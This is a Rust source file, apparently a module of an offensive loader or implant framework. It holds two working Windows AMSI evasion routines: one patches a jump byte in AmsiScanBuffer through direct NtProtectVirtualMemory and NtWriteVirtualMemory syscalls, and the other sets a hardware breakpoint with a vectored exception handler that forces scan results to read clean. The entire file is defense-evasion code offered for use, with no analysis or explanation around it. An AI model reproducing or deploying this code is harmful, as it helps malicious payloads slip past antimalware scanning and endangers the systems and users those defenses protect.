// =======================================================================================================
// AMSI EVASION Techniques
// =======================================================================================================

#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionAMSIHwbp"))]
use windows_sys::Win32::Foundation::HANDLE;

#[cfg(feature = "EvasionAMSISimplePatch")]
use std::ffi::c_void;

#[cfg(feature = "EvasionAMSISimplePatch")]
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
#[cfg(feature = "EvasionAMSISimplePatch")]
use windows_sys::Win32::System::Threading::GetCurrentProcess;
#[cfg(feature = "EvasionAMSISimplePatch")]
use rust_syscalls::syscall;

#[cfg(feature = "EvasionAMSIHwbp")]
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;

// =======================================================================================================
// AMSI EVASION: AmsiScanBuffer Patch
// =======================================================================================================

#[cfg(feature = "EvasionAMSISimplePatch")]
pub fn patch_amsi() -> Result<(), &'static str> {
    unsafe {
        // Load amsi.dll
        let amsi_dll = LoadLibraryA(b"amsi.dll\0".as_ptr());

        // Get AmsiScanBuffer address
        let amsi_scan_buffer = GetProcAddress(amsi_dll, b"AmsiScanBuffer\0".as_ptr());
        let amsi_scan_buffer_addr = amsi_scan_buffer.unwrap() as *mut c_void;

        // Calculate offset based on architecture
        #[cfg(target_arch = "x86")]
        let offset = 0x47;
        #[cfg(target_arch = "x86_64")]
        let offset = 0x6D;

        let patch_address = (amsi_scan_buffer_addr as usize + offset) as *mut c_void;

        // Patch byte: change JZ to JNZ (0x75)
        let patch: [u8; 1] = [0x75];

        // Change memory protection to RWX
        let mut old_protect: u32 = 0;
        let mut region_size: usize = patch.len();
        let mut base_address = patch_address;

        let status = syscall!(
            "NtProtectVirtualMemory",
            GetCurrentProcess() as HANDLE,
            &mut base_address as *mut *mut c_void,
            &mut region_size as *mut usize,
            0x40u32, // PAGE_EXECUTE_READWRITE
            &mut old_protect as *mut u32
        );

        // Write the patch
        let mut bytes_written: usize = 0;
        let status = syscall!(
            "NtWriteVirtualMemory",
            GetCurrentProcess() as HANDLE,
            patch_address,
            patch.as_ptr() as *const c_void,
            patch.len(),
            &mut bytes_written as *mut usize
        );

        // Restore original protection
        let mut temp_protect: u32 = 0;
        let mut region_size: usize = patch.len();
        let mut base_address = patch_address;

        let status = syscall!(
            "NtProtectVirtualMemory",
            GetCurrentProcess() as HANDLE,
            &mut base_address as *mut *mut c_void,
            &mut region_size as *mut usize,
            old_protect,
            &mut temp_protect as *mut u32
        );
        Ok(())
    }
}

// =======================================================================================================
// AMSI EVASION: Hardware Breakpoint Bypass
// =======================================================================================================

#[cfg(feature = "EvasionAMSIHwbp")]
use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
#[cfg(feature = "EvasionAMSIHwbp")]
use windows_sys::Win32::System::Diagnostics::Debug::{CONTEXT, EXCEPTION_POINTERS, EXCEPTION_RECORD};
#[cfg(feature = "EvasionAMSIHwbp")]
use windows_sys::Win32::System::Threading::GetCurrentThread;

#[cfg(feature = "EvasionAMSIHwbp")]
const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
#[cfg(feature = "EvasionAMSIHwbp")]
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
#[cfg(feature = "EvasionAMSIHwbp")]
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
#[cfg(feature = "EvasionAMSIHwbp")]
const CONTEXT_ALL: u32 = 0x10000B;

#[cfg(feature = "EvasionAMSIHwbp")]
static mut AMSI_SCAN_BUFFER_PTR: Option<*mut u8> = None;

#[cfg(feature = "EvasionAMSIHwbp")]
fn set_bits(dw: u64, low_bit: i32, bits: i32, new_value: u64) -> u64 {
    let mask = (1 << bits) - 1;
    (dw & !(mask << low_bit)) | (new_value << low_bit)
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn clear_breakpoint(ctx: &mut CONTEXT, index: i32) {
    match index {
        0 => ctx.Dr0 = 0,
        1 => ctx.Dr1 = 0,
        2 => ctx.Dr2 = 0,
        3 => ctx.Dr3 = 0,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags = 0;
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: i32) {
    match index {
        0 => ctx.Dr0 = address as u64,
        1 => ctx.Dr1 = address as u64,
        2 => ctx.Dr2 = address as u64,
        3 => ctx.Dr3 = address as u64,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, 16, 16, 0);
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 1);
    ctx.Dr6 = 0;
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn get_arg(ctx: &CONTEXT, index: i32) -> usize {
    match index {
        0 => ctx.Rcx as usize,
        1 => ctx.Rdx as usize,
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe { *((ctx.Rsp as *const u64).offset((index + 1) as isize) as *const usize) },
    }
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn get_return_address(ctx: &CONTEXT) -> usize {
    unsafe { *(ctx.Rsp as *const usize) }
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn set_result(ctx: &mut CONTEXT, result: usize) {
    ctx.Rax = result as u64;
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
    ctx.Rsp = (ctx.Rsp as i64 + amount as i64) as u64;
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
    ctx.Rip = new_ip as u64;
}

#[cfg(feature = "EvasionAMSIHwbp")]
unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        let exception_record = &*(*exceptions).ExceptionRecord;
        let ctx = &mut *(*exceptions).ContextRecord;

        let ptr = std::ptr::addr_of!(AMSI_SCAN_BUFFER_PTR);
        if exception_record.ExceptionCode == EXCEPTION_SINGLE_STEP as i32
            && exception_record.ExceptionAddress == (*ptr).unwrap() as *mut std::ffi::c_void
        {
            let return_address = get_return_address(ctx);
            let scan_result_ptr = get_arg(ctx, 5) as *mut i32;
            *scan_result_ptr = 0; // AMSI_RESULT_CLEAN

            set_ip(ctx, return_address);
            adjust_stack_pointer(ctx, std::mem::size_of::<*mut u8>() as i32);
            set_result(ctx, 0); // S_OK
            clear_breakpoint(ctx, 0);

            EXCEPTION_CONTINUE_EXECUTION
        } else {
            EXCEPTION_CONTINUE_SEARCH
        }
    }
}

#[cfg(feature = "EvasionAMSIHwbp")]
type NtGetContextThreadFn = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> u32;
#[cfg(feature = "EvasionAMSIHwbp")]
type NtSetContextThreadFn = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> u32;
#[cfg(feature = "EvasionAMSIHwbp")]
type AddVectoredExceptionHandlerFn = unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32) -> *mut std::ffi::c_void;

#[cfg(feature = "EvasionAMSIHwbp")]
pub fn patch_amsi_hwbp() -> Result<(), i32> {
    unsafe {
        let ptr = std::ptr::addr_of_mut!(AMSI_SCAN_BUFFER_PTR);
        if (*ptr).is_none() {
            let mut module_handle = GetModuleHandleA(b"amsi.dll\0".as_ptr()) as *mut std::ffi::c_void;
            if module_handle.is_null() {
                module_handle = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(b"amsi.dll\0".as_ptr()) as *mut std::ffi::c_void;
            }
            
            if module_handle.is_null() {
                return Err(-1);
            }

            let amsi_scan_buffer = GetProcAddress(module_handle, b"AmsiScanBuffer\0".as_ptr());
            if amsi_scan_buffer.is_none() {
                return Err(-2);
            }
            *ptr = Some(amsi_scan_buffer.unwrap() as *mut u8);
        }

        // Get kernel32 for AddVectoredExceptionHandler
        let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr()) as *mut std::ffi::c_void;
        if kernel32.is_null() {
            return Err(-3);
        }

        let add_veh_addr = GetProcAddress(kernel32, b"AddVectoredExceptionHandler\0".as_ptr());
        if add_veh_addr.is_none() {
            return Err(-4);
        }
        let add_veh: AddVectoredExceptionHandlerFn = std::mem::transmute(add_veh_addr.unwrap());

        let h_ex_handler = add_veh(1, exception_handler);
        if h_ex_handler.is_null() {
            return Err(-5);
        }

        // Get ntdll for NtGetContextThread and NtSetContextThread
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut std::ffi::c_void;
        if ntdll.is_null() {
            return Err(-6);
        }

        let nt_get_ctx_addr = GetProcAddress(ntdll, b"NtGetContextThread\0".as_ptr());
        if nt_get_ctx_addr.is_none() {
            return Err(-7);
        }
        let nt_get_context: NtGetContextThreadFn = std::mem::transmute(nt_get_ctx_addr.unwrap());

        let nt_set_ctx_addr = GetProcAddress(ntdll, b"NtSetContextThread\0".as_ptr());
        if nt_set_ctx_addr.is_none() {
            return Err(-8);
        }
        let nt_set_context: NtSetContextThreadFn = std::mem::transmute(nt_set_ctx_addr.unwrap());

        let mut thread_ctx: CONTEXT = std::mem::zeroed();
        thread_ctx.ContextFlags = CONTEXT_ALL;
        
        let status = nt_get_context(GetCurrentThread(), &mut thread_ctx);
        if status != 0 {
            return Err(-(status as i32));
        }

        let ptr = std::ptr::addr_of!(AMSI_SCAN_BUFFER_PTR);
        enable_breakpoint(&mut thread_ctx, (*ptr).unwrap(), 0);

        let status = nt_set_context(GetCurrentThread(), &mut thread_ctx);
        if status != 0 {
            return Err(-(status as i32));
        }

        Ok(())
    }
}